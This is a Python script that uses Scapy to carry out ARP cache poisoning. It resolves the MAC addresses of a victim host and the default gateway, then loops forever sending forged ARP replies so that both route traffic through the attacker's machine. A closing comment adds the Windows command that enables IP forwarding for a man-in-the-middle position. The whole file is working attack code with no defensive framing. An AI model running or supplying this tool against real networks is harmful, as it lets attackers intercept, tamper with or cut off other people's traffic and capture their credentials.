# ARP request
import scapy.all as scapy
from scapy.all import get_if_addr, get_if_hwaddr, get_working_ifaces, conf, show_interfaces, getmacbyip
import time, sys
from optparse import OptionParser


def get_mac(ip):
    arp_request = scapy.ARP(pdst = ip)
    broadcast = scapy.Ether(dst ="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast / arp_request
    answered_list = scapy.srp(arp_request_broadcast, timeout = 5, verbose = True)[0]
    try:
        return answered_list[0][1].hwsrc
    except:
        return get_mac(ip)


def get_default_gateway():
    route = conf.route.route("0.0.0.0")
    #print(route)
    return route[2]

def get_if_from_index(index):
    for iface in get_working_ifaces():
        #print(f"{type(iface.index)} - {type(index)}")
        if iface.index == int(index): 
            return iface

def get_atk_ip():
    iface = get_if_from_index(interface_index)
    if iface: return get_if_addr(iface)

def get_atk_mac():
    iface = get_if_from_index(interface_index)
    if iface: return get_if_hwaddr(iface)

def spoof(target_ip, target_mac, spoof_ip, attacker_mac):
    print(f"[+] Spoofing {target_ip} -> {spoof_ip} is-at {attacker_mac}")
    iface = get_if_from_index(interface_index)
    packet = scapy.Ether(dst=target_mac, src=attacker_mac)/scapy.ARP(
        op=2,                 # ARP reply (is-at)
        pdst=target_ip,       # IP da vítima
        #hwdst=target_mac,     # MAC da vítima
        psrc=spoof_ip,        # IP que estou falsificando
        hwsrc=attacker_mac,   # MAC do atacante (se passando pelo IP spoofado)
    )
    scapy.sendp(packet, verbose=False, iface= iface)


if __name__ == "__main__":
    global interface_index
    gateway_ip = get_default_gateway()
    gateway_mac = getmacbyip(gateway_ip)
    parser = OptionParser('Usage: %prog [-i interface index] [-v victim ip] host')
    parser.add_option(
        '-v',
        dest='victim',
        help='Specify a particular host to ARP poison')
    parser.add_option(
        '-i',
        dest='interface',
        help='Specify a network interface')

    if "-l" in sys.argv:
        show_interfaces()
        sys.exit(0)


    opts, arg = parser.parse_args()
    interface_index = int(opts.interface)
    victim_mac = get_mac(opts.victim)
    atk_ip = get_atk_ip()
    atk_mac = get_atk_mac()
    #print(victim_mac); print(atk_mac); print(gateway_mac)
    if not atk_ip or not gateway_ip: sys.exit(1)
    while True: 
        spoof(gateway_ip, gateway_mac, opts.victim, atk_mac)
        spoof(gateway_ip, gateway_mac, opts.victim, atk_mac)
        spoof(opts.victim, victim_mac, gateway_ip, atk_mac)
        time.sleep(2)



# ip forwarding (windows): netsh interface ipv4 set interface "Ethernet 34" forwarding=enabled

